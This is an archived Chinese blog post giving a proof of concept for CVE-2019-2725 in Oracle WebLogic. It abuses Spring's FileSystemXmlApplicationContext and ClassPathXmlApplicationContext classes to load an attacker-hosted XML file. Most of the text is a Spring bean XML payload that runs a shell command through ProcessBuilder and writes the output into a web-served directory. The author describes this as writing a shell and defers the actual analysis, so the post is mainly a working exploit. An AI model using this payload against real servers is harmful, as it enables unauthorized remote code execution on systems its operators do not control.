# CVE-2019-2725 二次反序列化FileSystemXmlApplicationContext Gadget POC - Afant1 - 博客园

> 原文：[https://www.cnblogs.com/afanti/p/10815728.html](https://www.cnblogs.com/afanti/p/10815728.html)

POC如下：
![](../Images/1409124778caccbb636d0cc12db8fec7.png)
除了FileSystemXmlApplicationContext这个类，还有com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext这个类跟他作用一样。
都是AbstractXmlApplicationContext类的子类，其中的FileSystemXmlApplicationContext和ClassPathXmlApplicationContext类可以用于加载spring的配置文件，利用spring的依赖注入同样可以完成RCE的利用。
![](../Images/31e77a3e60172f35e9a48c9f7ecd43ba.png)
写入恶意远程地址
![](../Images/8221b40b857d06abcd379912e365094f.png)
![](../Images/0de084ce4581ba33a11055339af2ff3c.png)
写入shell的xml这样写：

```
<?xml version="1.0" encoding="UTF-8" ?>
    <beans 

       xsi:schemaLocation="
     [url]http://www.springframework.org/schema/beans[/url] [url]http://www.springframework.org/schema/beans/spring-beans.xsd[/url]">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>sh</value>
                <value>-c</value>
                <value><![CDATA[whoami > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/favicon.ico]]></value>
            </list>
            </constructor-arg>
        </bean>
    </beans> 
```

漏洞分析先留个坑，有空在写出来